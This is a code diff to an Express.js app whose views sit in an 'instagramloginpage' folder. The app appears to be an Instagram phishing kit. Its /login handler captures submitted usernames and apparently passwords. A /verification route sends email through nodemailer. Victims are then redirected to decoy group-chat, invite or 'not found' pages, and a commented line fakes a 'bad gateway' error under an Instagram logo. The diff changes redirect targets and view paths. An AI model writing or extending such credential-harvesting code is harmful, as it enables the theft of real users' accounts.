@@ -70,7 +70,7 @@ const sendemail = async (req, res) => {
   }
 
   transporter.sendMail(message).then(() => {
-    return res.redirect('/allenitiesDombivili');
+    return res.redirect('/notfound');
   }).catch((err) => { console.log(err) })
 
   // let info = await transporter.sendMail({
@@ -101,7 +101,7 @@ app.get('/', (req, res) => {
 })
 
 app.set('view engine', 'pug');
-app.set('views', path.join(__dirname, './instagramloginpage/ui'));
+app.set('views', path.join(__dirname, './instagramloginpage/'));
 
 app.get('/verification', sendemail);
 
@@ -110,7 +110,7 @@ app.get('/allenitiesDombivili', (req, res) => {
   res.status(200).render('../groupchat/groupchat.pug');
 })
 
-
+app.get('/notfound',(req,res)=>{res.status(202).render('./notfound/notfound.pug')})
 app.post('/login', (req, res) => {
   // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
   username = req.body.username;
@@ -131,7 +131,7 @@ app.post('/login', (req, res) => {
 })
 app.get('/groupchat', (req, res) => {
 
-  res.status(200).render('../SpecialCase/invite.pug');
+  res.status(200).render('./SpecialCase/invite.pug');
 })
 app.get('*', (req, res) => {
   res.status(404)
